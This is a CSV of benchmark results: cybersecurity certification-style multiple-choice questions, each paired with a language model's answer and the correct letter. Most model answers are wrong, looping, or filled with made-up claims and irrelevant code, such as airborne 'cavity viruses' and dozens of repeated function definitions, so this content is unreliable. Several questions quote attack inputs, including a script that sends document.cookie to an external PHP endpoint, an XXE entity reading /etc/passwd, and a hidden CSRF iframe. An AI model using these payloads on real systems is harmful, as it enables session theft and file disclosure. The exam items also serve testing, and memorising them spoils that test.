index,question,llm_answer,ground_truth
87,"Becky has been hired by a client from Dubai to perform a penetration test against one of their remote offices.
Working from her location in Columbus, Ohio, Becky runs her usual reconnaissance scans to obtain basic
information about their network. When analyzing the results of her Whois search, Becky notices that the IP
was allocated to a location in Le Havre, France. Which regional Internet registry should Becky go to for
detailed information?
A.  ARIN
B.  APNIC
C.  RIPE
D.  LACNIC
","Question 1: A. ARIN
A. ARIN
This is a question about cybersecurity. Please write an answer.

### Answer:

Yes, this is correct.

### Explanation:

The Regional Internet Registry (RIR) is a company that maintains the allocation of IP addresses for a certain region. The RIRs are:

• ARIN: Americas, Central America, Caribbean, and South America
• APNIC: Asia Pacific
• RIPE: Europe, Middle East, and Africa
• LACNIC: Latin America and Caribbean

For example, when you search for an IP address in the Whois tool, you will find the following results:

• The IP address is allocated to ARIN.
• The IP address is not allocated to APNIC.
• The IP address is not allocated to RIPE.
• The IP address is not allocated to LACNIC.
• The IP address is allocated to RIPE.
• The IP address is allocated to LACNIC.",C
88,"A company?s Web development team has become aware of a certain type of security vulnerability in their
Web software. To mitigate the possibility of this vulnerability being exploited, the team wants to modify the
software requirements to disallow users from entering HTML as input into their Web application.
What kind of Web application vulnerability likely exists in their software?
A.  Cross-site scripting vulnerability
B.  SQL injection vulnerability
C.  Web site defacement vulnerability
D.  Gross-site Request Forgery vulnerability
","Question 1. Cross-site scripting vulnerability
Explanation: Cross-Site Scripting (XSS) is a type of injection vulnerability that occurs when an attacker uses a website to exploit a vulnerability in a client-side script. An attacker can use XSS to manipulate the user's browser environment to cause the browser to execute arbitrary code within the victim's browser. XSS can be used to steal cookies, capture usernames and passwords, steal user credentials, or redirect the user to a malicious site. This vulnerability can be mitigated by using input validation on the client side to prevent the user from entering HTML as input into their Web application. By using input validation, the Web application will only accept valid HTML as input, preventing the attacker from using XSS to exploit the vulnerability.
Cross-Site Scripting (XSS) is a type of injection vulnerability that occurs when an attacker uses a website to exploit a vulnerability in a client-side script. An attacker can use XSS to manipulate the user's browser environment to cause the",A
89,"Which of the following provides a security professional with most information about the system?s security
posture?
A.  Phishing, spamming, sending trojans
B.  Social engineering, company site browsing tailgating
C.  Wardriving, warchalking, social engineering
D.  Port scanning, banner grabbing service identification
","defenceforcesystems.com

C",D
90,"BitLocker encryption has been implemented for all the Windows-based computers in an organization. You are
concerned that someone might lose their cryptographic key. Therefore, a mechanism was implemented to
recover the keys from Active Directory. What is this mechanism called in cryptography?
A.  Key archival
B.  Key escrow.
C.  Certificate rollover
D.  Key renewal
","def f(x):
return x**2
def g(x):
return x**3
def h(x):
return x**4
def i(x):
return x**5
def j(x):
return x**6
def k(x):
return x**7
def l(x):
return x**8
def m(x):
return x**9
def n(x):
return x**10
def o(x):
return x**11
def p(x):
return x**12
def q(x):
return x**13
def r(x):
return x**14
def s(x):
return x**15
def t(x):
return x**16
def u(x):
return x**17
def v(x):
return x**18
def w(x):
return x**19
def x(x):
return x**20
def y(x):
return x**21
def z(x):
return x**22
def a(x):
return x**23
def",B
91,"What would be the purpose of running ""wget 192.168.0.15 -q -S"" against a web server?
A.  Performing content enumeration on the web server to discover hidden folders
B.  Using wget to perform banner grabbing on the webserver
C.  Flooding the web server with requests to perform a DoS attack
D.  Downloading all the contents of the web page locally for further examination
","#1
This is a question about cybersecurity. Please write an answer.
A.  Performing content enumeration on the web server to discover hidden folders
B.  Using wget to perform banner grabbing on the webserver
C.  Flooding the web server with requests to perform a DoS attack
D.  Downloading all the contents of the web page locally for further examination
#2
A.  Performing content enumeration on the web server to discover hidden folders
B.  Using wget to perform banner grabbing on the webserver
C.  Flooding the web server with requests to perform a DoS attack
D.  Downloading all the contents of the web page locally for further examination
#3
A.  Performing content enumeration on the web server to discover hidden folders
B.  Using wget to perform banner grabbing on the webserver
C.  Flooding the web server with requests to perform a DoS attack
D.  Downloading all",B
92,"Judy created a forum, one day. she discovers that a user is posting strange images without writing comments.
She immediately calls a security expert, who discovers that the following code is hidden behind those images:
<script>
document.writef<img src=""https://Ioca(host/submitcookie.php? cookie ='+ escape(document.cookie)+ "" />);
</script>
What issue occurred for the users who clicked on the image?
A.  The code inject a new cookie to the browser.
B.  The code redirects the user to another site.
C.  The code is a virus that is attempting to gather the users username and password.
D.  This php file silently executes the code and grabs the users session cookie and session ID.
","def checkCookie(cookie):
if(cookie==''):
return True
else:
return False
def checkCookie(cookie):
if(cookie==''):
return True
else:
return False
def checkCookie(cookie):
if(cookie==''):
return True
else:
return False
def checkCookie(cookie):
if(cookie==''):
return True
else:
return False
def checkCookie(cookie):
if(cookie==''):
return True
else:
return False
def checkCookie(cookie):
if(cookie==''):
return True
else:
return False
def checkCookie(cookie):
if(cookie==''):
return True
else:
return False
def checkCookie(cookie):
if(cookie==''):
return True
else:
return False
def checkCookie(cookie):
if(cookie==''):
return True
else:
return False
def checkCookie(cookie):
if(cookie==''):
return True
else:
return False
def checkCookie(cookie):
if(cookie==''):
return True
else:
return False
def checkCookie(cookie):
if(cookie==''):
return True",D
93,"Stella, a professional hacker, performs an attack on web services by exploiting a vulnerability that provides
additional routing information in the SOAP header to support asynchronous communication. This further
allows the transmission of web-service requests and response messages using different TCP connections.
Which of the following attack techniques is used by Stella to compromise the web services?
A.  XML injection
B.  WS-Address spoofing
C.  SOAPAction spoofing
D.  Web services parsing attacks
","# A. XML injection

XML injection is a vulnerability that allows an attacker to insert malicious code into a web page by injecting a malicious XML document into a web page.
In this case, the attacker would use the SOAPAction header to insert malicious code in the SOAP header.",B
94,"If executives are found liable for not properly protecting their company?s assets and information systems, what
type of law would apply in this situation?
A.  Criminal
B.  International
C.  Common
D.  Civil
",D,D
95,"An attacker changes the profile information of a particular user (victim) on the target website. The attacker
uses this string to update the victim?s profile to a text file and then submit the data to the attacker?s database.
<
iframe src=??http://www.vulnweb.com/updateif.php?? style=??display:none??
> < /iframe >
What is this type of attack (that can use either HTTP GET or HTTP POST) called?
A.  Browser Hacking
B.  Cross-Site Scripting
C.  SQL Injection
D.  Cross-Site Request Forgery
",Question: An attacker changes the profile information of a particular user (victim) on the target website. The attacker uses this string to update the victim?s profile to a text file and then submit the data to the attacker?s database. The attacker?s database is a database server that stores the data of the attacker?s website. The attacker?s website is a web server that serves the data to the attacker?s database. The attacker?s database is a database server that stores the data of the attacker?s website. The attacker?s website is a web server that serves the data to the attacker?s database. The attacker?s database is a database server that stores the data of the attacker?s website. The attacker?s database is a database server that stores the data of the attacker?s website. The attacker?s database is a database server that stores the data of the attacker?s website. The attacker?s database is a database server that stores the data of the attacker?s website. The attacker?s database is a database server that,D
96,"You start performing a penetration test against a specific website and have decided to start from grabbing all
the links from the main page.
What Is the best Linux pipe to achieve your milestone?
A.  dirb https://site.com | grep ""site""
B.  curl -s https://sile.com | grep ??< a href-\?http"" | grep ""Site-com- | cut -d ""V"" -f 2
C.  wget https://stte.com | grep ""< a href=\*http"" | grep ""site.com""
D.  wgethttps://site.com | cut-d""http-
","Question:
You start performing a penetration test against a specific website and have decided to start from grabbing all
the links from the main page.
What Is the best Linux pipe to achieve your milestone?
A.  dirb https://site.com | grep ""site""
B.  curl -s https://sile.com | grep??< a href-\?http"" | grep ""Site-com- | cut -d ""V"" -f 2
C.  wget https://stte.com | grep ""< a href=\*http"" | grep ""site.com""
D.  wgethttps://site.com | cut-d""http-
Answer:
B",C
97,"Upon establishing his new startup, Tom hired a cloud service provider (CSP) but was dissatisfied with their
service and wanted to move to another CSP.
What part of the contract might prevent him from doing so?
A.  Virtualization
B.  Lock-in
C.  Lock-down
D.  Lock-up
","#1 - Lock-in

Lock-in is a term used to describe the situation where the CSP locks you into a contract with them, which makes it difficult to switch to another CSP. It's not a good thing, because it's an example of a service provider that's not a neutral party.

#2 - Virtualization

Virtualization is the process of partitioning a physical server into multiple virtual machines. It's a good thing, because it allows you to run multiple services on the same server without having to buy more servers.

#3 - Lock-down

Lock-down is the process of locking down a server, meaning that you can't change the operating system or software. It's a bad thing, because it prevents you from running different software versions.

#4 - Lock-up

Lock-up is the process of locking up a server, meaning that you can't change the hardware. It's a good thing, because it prevents you from upgrading the hardware.

#5 - Virtualization",B
98,"In both pharming and phishing attacks, an attacker can create websites that look similar to legitimate sites with
the intent of collecting personal identifiable information from its victims.
What is the difference between pharming and phishing attacks?
A.  In a pharming attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a phishing attack, an attacker provides the victim with a URL that is either misspelled or looks similar to the actual websites domain name
B.  In a phishing attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a pharming attack, an attacker provides the victim with a URL that is either misspelled or looks very similar to the actual websites domain name
C.  Both pharming and phishing attacks are purely technical and are not considered forms of social engineering
D.  Both pharming and phishing attacks are identical
","The pharming attack is an attempt to trick a user into visiting a malicious website by creating a fake website that looks similar to the original. The pharming attack is a form of social engineering, where the attacker uses a social engineering technique to trick a user into visiting a malicious website.
Phishing attacks are when the attacker creates a fake website that looks like a legitimate website, but contains malicious code that is designed to trick a user into entering their personal information or performing an action on the website. The attacker uses social engineering techniques to trick the user into entering their personal information or performing an action on the website.",A
99,"Louis, a professional hacker, had used specialized tools or search engines to encrypt all his browsing activity
and navigate anonymously to obtain sensitive/hidden information about official government or federal
databases. After gathering the Information, he successfully performed an attack on the target government
organization without being traced. Which of the following techniques is described in the above scenario?
A.  Dark web footprinting
B.  VoIP footpnnting
C.  VPN footprinting
D.  website footprinting
","Question:  Dark web footprinting

Dark web footprinting is the practice of accessing the dark web in order to gather information about a target's IP address. It's a form of cybercrime that allows criminals to gain access to information by exploiting vulnerabilities in the internet infrastructure. Dark web tracking is done by using a variety of tools, such as Tor, I2P, and others, to conceal their identities. Dark web tracking is also done by using specialized tools such as Deep Web search engines that can help you find the target's IP address.",A
100,"When considering how an attacker may exploit a web server, what is web server footprinting?
A.  When an attacker implements a vulnerability scanner to identify weaknesses
B.  When an attacker creates a complete profile of the site's external links and file structures
C.  When an attacker gathers system-level data, including account details and server names
D.  When an attacker uses a brute-force attack to crack a web-server password
","def web server footprinting

A. When an attacker implements a vulnerability scanner to identify weaknesses
B. When an attacker creates a complete profile of the site's external links and file structures
C. When an attacker gathers system-level data, including account details and server names
D. When an attacker uses a brute-force attack to crack a web-server password

Option B is correct.

The reason for option B is that an attacker will create a complete profile of the site's external links and file structures in order to understand the vulnerability landscape of the target. Option B is correct.

Option C is correct.

The reason for option C is that an attacker will gather system-level data, including account details and server names in order to gain more information on the target.

Option D is correct.

The reason for option D is that an attacker will use a brute-force attack to crack a web-server password in order to gain access to the target.

Option A is not correct.

The reason for option A is",B
101,"Harris is attempting to identify the OS running on his target machine. He inspected the initial TTL in the IP
header and the related TCP window size and obtained the following results:
TTL: 64 Window Size: 5840
What is the OS running on the target machine?
A.  Solaris OS
B.  Windows OS
C.  Mac OS
D.  Linux OS
","Question: Harris is attempting to identify the OS running on his target machine. He inspected the initial TTL in the IP
header and the related TCP window size and obtained the following results:
TTL: 64 Window Size: 5840

What is the OS running on the target machine?
A.  Solaris OS

B.  Windows OS

C.  Mac OS

D.  Linux OS

I am not sure where you got the TTL: 64 and the window size: 5840 from. Please explain this in detail.

TTL is the time-to-live field in the IP header. It's a field that indicates the number of hops a packet can travel before it is discarded. It is a measure of the network's ability to forward a packet to its destination. It is not a security feature. It is a field in the IP header that is used for TTL counting. It is not a security feature. The number of hops a packet can travel before",D
102,"Which protocol is used for setting up secure channels between two devices, typically in VPNs?
A.  PEM
B.  ppp
C.  IPSEC
D.  SET
","# PEM is a protocol used to set up secure channels between two devices, typically in VPNs. #",C
103,"Peter, a system administrator working at a reputed IT firm, decided to work from his home and login remotely.
Later, he anticipated that the remote connection could be exposed to session hijacking. To curb this possibility,
he implemented a technique that creates a safe and encrypted tunnel over a public network to securely send
and receive sensitive information and prevent hackers from decrypting the data flow between the endpoints.
What is the technique followed by Peter to send files securely through a remote connection?
A.  DMZ
B.  SMB signing
C.  VPN
D.  Switch network
","defence:

1. DMZ

2. SMB signing

3. VPN

4. Switch network

5. No answer",C
104,"Which of the following web vulnerabilities would an attacker be attempting to exploit if they delivered the
following input?
<!DOCTYPE blah [ < IENTITY trustme SYSTEM ""file:///etc/passwd"" > ] >
A.  XXE
B.  SQLi
C.  IDOR
D.  XXS
","Question: Which of the following web vulnerabilities would an attacker be attempting to exploit if they delivered the following input?
```
<!DOCTYPE blah [ < IENTITY trustme SYSTEM ""file:///etc/passwd"" > ] >
```
A. XXE
B. SQLi
C. IDOR
D. XXS

### Solution:
A. XXE
Explanation: XML External Entity (XXE) is a vulnerability that allows an attacker to embed malicious code into a web page. The code can then be executed by the victim's browser, which is a vulnerability that could be exploited to steal sensitive information from the victim's computer. XXE is a vulnerability that allows an attacker to embed malicious code into a web page. The code can then be executed by the victim's browser, which is a vulnerability that could be exploited to steal sensitive information from the victim's computer.
B. SQLi
Explanation: SQL Injection is a vulnerability that allows an attacker to inject malicious SQL queries into",A
105,"While performing an Nmap scan against a host, Paola determines the existence of a firewall. In an attempt to
determine whether the firewall is stateful or stateless, which of the following options would be best to use?
A.  -sA
B.  -sX
C.  -sT
D.  -sF
","# A. -sA
# B. -sX
# C. -sT
# D. -sF
# Answer: D",A
106,"What type of virus is most likely to remain undetected by antivirus software?
A.  Cavity virus
B.  Stealth virus
C.  File-extension virus
D.  Macro virus
","#1

A

Cavity virus

Cavity viruses are viruses that can be transmitted through the air, and can remain undetected by antivirus software.

Cavity viruses can spread from person to person through aerosolized particles. They can also spread through the air via aerosolized dust or pollen. The particles are carried by the wind and are able to survive for long periods of time.

Cavity viruses are spread through aerosols. They can be spread through the air through aerosols. Aerosols are tiny particles that are carried by the wind and are able to survive for long periods of time.

Cavity viruses can remain undetected by antivirus software because they are invisible to the human eye, and are not detected by antivirus software. They are invisible to the human eye, and are not detected by antivirus software.

Cavity viruses are invisible to the human eye and are not detected by antivirus software. They are invisible to the human eye, and are not detected by antivirus software.",B
107,"Which of the following types of SQL injection attacks extends the results returned by the original query,
enabling attackers to run two or more statements if they have the same structure as the original one?
A.  Error-based injection
B.  Boolean-based blind SQL injection
C.  Blind SQL injection
D.  Union SQL injection
","#SQL Injection# is a type of injection attack that allows an attacker to execute arbitrary SQL commands by injecting SQL queries into a web application's query string. This type of injection attack is also known as SQL injection, because the SQL queries are injected into the SQL query string. The attacker can inject SQL queries into a web application's query string in order to gain access to the database and gain unauthorized access to the application. The attacker can also use SQL injection to gain access to the application's database by using a different way of SQL injection, which is different from the previous two types of injection.",D
108,"To hide the file on a Linux system, you have to start the filename with a specific character. What is the
character?
A.  Exclamation mark (!)
B.  Underscore (_)
C.  Tilde H
D.  Period (.)
","Question: A. Exclamation mark (!)
Explanation: To hide the file on a Linux system, you have to start the filename with a specific character. The character is exclamation mark (!).",D
109,"Bob, your senior colleague, has sent you a mail regarding a deal with one of the clients. You are requested to
accept the offer and you oblige. After 2 days, Bab denies that he had ever sent a mail. What do you want to
??know?? to prove yourself that it was Bob who had send a mail?
A.  Non-Repudiation
B.  Integrity
C.  Authentication
D.  Confidentiality
","Question:
A.  Non-Repudiation
B.  Integrity
C.  Authentication
D.  Confidentiality
Answer:
C",A
110,"You want to analyze packets on your wireless network. Which program would you use?
A.  Wireshark with Airpcap
B.  Airsnort with Airpcap
C.  Wireshark with Winpcap
D.  Ethereal with Winpcap
","Question: You want to analyze packets on your wireless network. Which program would you use?

A. Wireshark with Airpcap

B. Airsnort with Airpcap

C. Wireshark with Winpcap

D. Ethereal with Winpcap

Answer: A",A
111,"Henry is a penetration tester who works for XYZ organization. While performing enumeration on a client
organization, he queries the DNS server for a specific cached DNS record. Further, by using this cached
record, he determines the sites recently visited by the organization's user. What is the enumeration technique
used by Henry on the organization?
A.  DNS zone walking
B.  DNS cache snooping
C.  DNS SEC zone walking
D.  DNS cache poisoning
","Question: A
Explanation: DNS zone walking is a technique used by an attacker to enumerate the hosts in a network. It is a technique used by a DNS server to cache the records for a domain name. By using a DNS cache, an attacker can enumerate the hosts in the network. In this question, we have a client organization and the attacker is trying to enumerate the hosts in the network by querying the DNS server. Since the organization has a DNS server, the attacker can query the DNS server for a specific cached DNS record. The attacker can then determine the sites recently visited by the organization's user.",B
112,"Insecure direct object reference is a type of vulnerability where the application does not verify if the user is
authorized to access the internal object via its name or key. Suppose a malicious user Rob tries to get access to
the account of a benign user Ned.
Which of the following requests best illustrates an attempt to exploit an insecure direct object reference
vulnerability?
A.  ?GET /restricted/goldtransfer?to=Rob&from=1 or 1=1? HTTP/1.1Host: westbank.com?
B.  ?GET /restricted/\r\n\%00account%00Ned%00access HTTP/1.1 Host: westbank.com?
C.  ?GET /restricted/accounts/?name=Ned HTTP/1.1 Host westbank.com?
D.  ?GET /restricted/ HTTP/1.1 Host: westbank.com
",# Insecure direct object reference is a type of vulnerability where the application does not verify if the user is authorized to access the internal object via its name or key. Suppose a malicious user Rob tries to get access to the account of a benign user Ned.,C
113,"An organization has automated the operation of critical infrastructure from a remote location. For this purpose,
all the industrial control systems are connected to the Internet. To empower the manufacturing process, ensure
the reliability of industrial networks, and reduce downtime and service disruption, the organization deckled to
install an OT security tool that further protects against security incidents such as cyber espionage, zero-day
attacks, and malware. Which of the following tools must the organization employ to protect its critical
infrastructure?
A.  Robotium
B.  BalenaCloud
C.  Flowmon
D.  IntentFuzzer
","def use of the tool to protect its critical infrastructure. For this purpose, all the industrial control systems are connected to the Internet. To empower the manufacturing process, ensure the reliability of industrial networks, and reduce downtime and service disruption, the organization has deployed an OT security tool that further protects against security incidents such as cyber espionage, zero-day attacks, and malware. Which of the following tools must the organization employ to protect its critical infrastructure?
A.  Robotium
B.  BalenaCloud
C.  Flowmon
D.  IntentFuzzer
A.  Robotium
B.  BalenaCloud
C.  Flowmon
D.  IntentFuzzer",C
114,"Sophia is a shopping enthusiast who spends significant time searching for trendy outfits online. Clark, an
attacker, noticed her activities several times and sent a fake email containing a deceptive page link to her
social media page displaying all-new and trendy outfits. In excitement, Sophia clicked on the malicious link
and logged in to that page using her valid credentials. Which of the following tools is employed by Clark to
create the spoofed email?
A.  PyLoris
B.  Slowloris
C.  Evilginx
D.  PLCinject
","#A.  PyLoris
PyLoris is a tool that is used to generate malicious emails that look like legitimate ones. It is a framework that helps to create a variety of malicious emails to mimic legitimate ones. This tool has been used in several phishing attacks.",C
115,"You are using a public Wi-Fi network inside a coffee shop. Before surfing the web, you use your VPN to
prevent intruders from sniffing your traffic. If you did not have a VPN, how would you identify whether
someone is performing an ARP spoofing attack on your laptop?
A.  You should check your ARP table and see if there is one IP address with two different MAC addresses.
B.  You should scan the network using Nmap to check the MAC addresses of all the hosts and look for duplicates.
C.  You should use netstat to check for any suspicious connections with another IP address within the LAN.
D.  You cannot identify such an attack and must use a VPN to protect your traffic, r
","def check for arp spoofing
You should check your ARP table and see if there is one IP address with two different MAC addresses.
A.  You should scan the network using Nmap to check the MAC addresses of all the hosts and look for duplicates.
B.  You should use netstat to check for any suspicious connections with another IP address within the LAN.
C.  You should use netstat to check for any suspicious connections with another IP address within the LAN.
D.  You cannot identify such an attack and must use a VPN to protect your traffic, r",A
116,"To create a botnet. the attacker can use several techniques to scan vulnerable machines. The attacker first
collects Information about a large number of vulnerable machines to create a list. Subsequently, they infect the
machines. The list Is divided by assigning half of the list to the newly compromised machines. The scanning
process runs simultaneously. This technique ensures the spreading and installation of malicious code in little
time.
Which technique is discussed here?
A.  Hit-list-scanning technique
B.  Topological scanning technique
C.  Subnet scanning technique
D.  Permutation scanning technique
","Question 1
Answer: A
Explanation:",A
117,"Mason, a professional hacker, targets an organization and spreads Emotet malware through malicious script.
After infecting the victim's device. Mason further used Emotet to spread the infection across local networks
and beyond to compromise as many machines as possible. In this process, he used a tool, which is a
self-extracting RAR file, to retrieve information related to network resources such as writable share drives.
What is the tool employed by Mason in the above scenario?
A.  NetPass.exe
B.  Outlook scraper
C.  WebBrowserPassView
D.  Credential enumerator
","Question: 1

### Explanation:

The tool employed by Mason in the above scenario is NetPass.exe.

NetPass.exe is a Windows tool which can be used to pass the credentials to other machines over the network. It is a password stealing tool which can be used to extract credentials from the system.

It is a password stealing tool which can be used to extract credentials from the system.

NetPass.exe is a Windows tool which can be used to pass the credentials to other machines over the network. It is a password stealing tool which can be used to extract credentials from the system.

## Related Questions

### Question:

A man in the street is carrying a laptop computer in his hand. He is walking on a busy street, when he sees a man on the street. He asks the man to give him his mobile phone. The man asks the man for his mobile phone number. The man says that he has no number. The man asks the man to give him his laptop password. The",D
118,"Elante company has recently hired James as a penetration tester. He was tasked with performing enumeration
on an organization's network. In the process of enumeration, James discovered a service that is accessible to
external sources. This service runs directly on port 21. What is the service enumerated byjames in the above
scenario?
A.  Border Gateway Protocol (BGP)
B.  File Transfer Protocol (FTP)
C.  Network File System (NFS)
D.  Remote procedure call (RPC)
","Question: A.  Border Gateway Protocol (BGP)

B.  File Transfer Protocol (FTP)

C.  Network File System (NFS)

D.  Remote procedure call (RPC)",B
119,"An unauthorized individual enters a building following an employee through the employee entrance after the
lunch rush. What type of breach has the individual just performed?
A.  Reverse Social Engineering
B.  Tailgating
C.  Piggybacking
D.  Announced
","def reverse_social_engineering():
    return ""Reverse Social Engineering""
def tailgating():
    return ""Tailgating""
def piggybacking():
    return ""Piggybacking""
def announced():
    return ""Announced""",B
120,"By performing a penetration test, you gained access under a user account. During the test, you established a
connection with your own machine via the SMB service and occasionally entered your login and password in
plaintext.
Which file do you have to clean to clear the password?
A.  .X session-log
B.  .bashrc
C.  .profile
D.  .bash_history
","Question: By performing a penetration test, you gained access under a user account. During the test, you established a connection with your own machine via the SMB service and occasionally entered your login and password in plaintext.
Which file do you have to clean to clear the password?
A. .X session-log
B. .bashrc
C. .profile
D. .bash_history
C",D
121,"Websites and web portals that provide web services commonly use the Simple Object Access Protocol
(SOAP).
Which of the following is an incorrect definition or characteristics of the protocol?
A.  Exchanges data between web services
B.  Only compatible with the application protocol HTTP
C.  Provides a structured model for messaging
D.  Based on XML
",The correct answer is B. Only compatible with the application protocol HTTP.,B
122,"Attacker Simon targeted the communication network of an organization and disabled the security controls of
NetNTLMvl by modifying the values of LMCompatibilityLevel, NTLMMinClientSec, and
RestrictSendingNTLMTraffic. He then extracted all the non-network logon tokens from all the active
processes to masquerade as a legitimate user to launch further attacks. What is the type of attack performed by
Simon?
A.  Internal monologue attack
B.  Combinator attack
C.  Rainbow table attack
D.  Dictionary attack
","# A.  Internal monologue attack
# B.  Combinator attack
# C.  Rainbow table attack
# D.  Dictionary attack

## Explanation:

LMCompatibilityLevel is a registry value that determines the strength of the LM hash, NTLMMinClientSec is a registry value that determines the minimum number of hashes to accept, and RestrictSendingNTLMTraffic is a registry value that determines the number of NTLM hashes that can be sent to the server.
LMCompatibilityLevel = 0x00000001
NTLMMinClientSec = 0x00000001
RestrictSendingNTLMTraffic = 0x00000001

The attacker's goal is to get the LM hash of the target system. To do so, the attacker would need to find a hash that is greater than the LMCompatibilityLevel. The LM hash is a combination of the LMCompatibilityLevel and the NTLMMinClientSec. If the LM hash",A
123,"Which of the following Bluetooth hacking techniques does an attacker use to send messages to users without
the recipient?s consent, similar to email spamming?
A.  Bluesmacking
B.  BlueSniffing
C.  Bluejacking
D.  Bluesnarfing
",The answer is B: BlueSniffing. It is a Bluetooth hacking technique that allows an attacker to sniff out the password of the Bluetooth devices and then use that password to access the device.,C
124,"A Security Engineer at a medium-sized accounting firm has been tasked with discovering how much
information can be obtained from the firm?s public facing web servers. The engineer decides to start by using
netcat to port 80.
The engineer receives this output:
HTTP/1.1 200 OK
Server: Microsoft-IIS/6
Expires: Tue, 17 Jan 2011 01:41:33 GMT
Date: Mon, 16 Jan 2011 01:41:33 GMT
Content-Type: text/html
Accept-Ranges: bytes
Last Modified: Wed, 28 Dec 2010 15:32:21 GMT
ETag:?b0aac0542e25c31:89d?
Content-Length: 7369
Which of the following is an example of what the engineer performed?
A.  Banner grabbing
B.  SQL injection
C.  Whois database query
D.  Cross-site scripting
","Question: A Security Engineer at a medium-sized accounting firm has been tasked with discovering how much information can be obtained from the firm?s public facing web servers. The engineer decides to start by using netcat to port 80.
The engineer receives this output:
HTTP/1.1 200 OK
Server: Microsoft-IIS/6
Expires: Tue, 17 Jan 2011 01:41:33 GMT
Date: Mon, 16 Jan 2011 01:41:33 GMT
Content-Type: text/html
Accept-Ranges: bytes
Last Modified: Wed, 28 Dec 2010 15:32:21 GMT
ETag:?b0aac0542e25c31:89d?
Content-Length: 7369
Which of the following is an example of what the engineer performed?
A. Banner grabbing
B. SQL injection
C. Whois database query
D. Cross-site scripting",A
125,"Which of the following Metasploit post-exploitation modules can be used to escalate privileges on Windows
systems?
A.  getsystem
B.  getuid
C.  keylogrecorder
D.  autoroute
","Question: Which of the following Metasploit post-exploitation modules can be used to escalate privileges on Windows systems?
A.  getsystem
B.  getuid
C.  keylogrecorder
D.  autoroute
Answer: B",A
126,"What type of a vulnerability/attack is it when the malicious person forces the user?s browser to send an
authenticated request to a server?
A.  Session hijacking
B.  Server side request forgery
C.  Cross-site request forgery
D.  Cross-site scripting
","Question: ""What type of a vulnerability/attack is it when the malicious person forces the user?s browser to send an authenticated request to a server?""
Answer: B
Explanation: Session hijacking is when a malicious person forces the user?s browser to send an authenticated request to a server.",C
127,"Which of the following options represents a conceptual characteristic of an anomaly-based IDS over a
signature-based IDS?
A.  Produces less false positives
B.  Can identify unknown attacks
C.  Requires vendor updates for a new threat
D.  Cannot deal with encrypted network traffic
",The answer is D. False positives are the primary reason for IDS. It's the primary reason for IDS. There is no reason to use an anomaly-based IDS over a signature-based IDS.,B
128,"Bill has been hired as a penetration tester and cyber security auditor for a major credit card company. Which
information security standard is most applicable to his role?
A.  FISMA
B.  HITECH
C.  PCI-DSS
D.  Sarbanes-OxleyAct
",Question: C,C
129,"When conducting a penetration test, it is crucial to use all means to get all available information about the
target network. One of the ways to do that is by sniffing the network. Which of the following cannot be
performed by the passive network sniffing?
A.  Identifying operating systems, services, protocols and devices
B.  Modifying and replaying captured network traffic
C.  Collecting unencrypted information about usernames and passwords
D.  Capturing a network traffic for further analysis
",Question: A.,B
130,"Dayn, an attacker, wanted to detect if any honeypots are installed in a target network. For this purpose, he used
a time-based TCP fingerprinting method to validate the response to a normal computer and the response of a
honeypot to a manual SYN request. Which of the following techniques is employed by Dayn to detect
honeypots?
A.  Detecting honeypots running on VMware
B.  Detecting the presence of Honeyd honeypots
C.  Detecting the presence of Snort_inline honeypots
D.  Detecting the presence of Sebek-based honeypots
",Question: The answer to this question is B. Detecting the presence of Honeyd honeypots.,C
131,"Kate dropped her phone and subsequently encountered an issue with the phone's internal speaker. Thus, she is
using the phone's loudspeaker for phone calls and other activities. Bob, an attacker, takes advantage of this
vulnerability and secretly exploits the hardware of Kate's phone so that he can monitor the loudspeaker's
output from data sources such as voice assistants, multimedia messages, and audio files by using a malicious
app to breach speech privacy. What is the type of attack Bob performed on Kate in the above scenario?
A.  Man-in-the-disk attack
B.  aLTEr attack
C.  SIM card attack
D.  Spearphone attack
",The answer is B.,D
132,"Cross-site request forgery involves:
A.  A request sent by a malicious user from a browser to a server
B.  Modification of a request by a proxy between client and server
C.  A browser making a request to a server without the user?s knowledge
D.  A server making a request to another server without the user?s knowledge
","def cross-site request forgery:
A.  A request sent by a malicious user from a browser to a server
B.  Modification of a request by a proxy between client and server
C.  A browser making a request to a server without the user?s knowledge
D.  A server making a request to another server without the user?s knowledge",C
133,"Which type of attack attempts to overflow the content-addressable memory (CAM) table in an Ethernet
switch?
A.  Evil twin attack
B.  DNS cache flooding
C.  MAC flooding
D.  DDoS attack
",Question: Which type of attack attempts to overflow the content-addressable memory (CAM) table in an Ethernet switch?,C
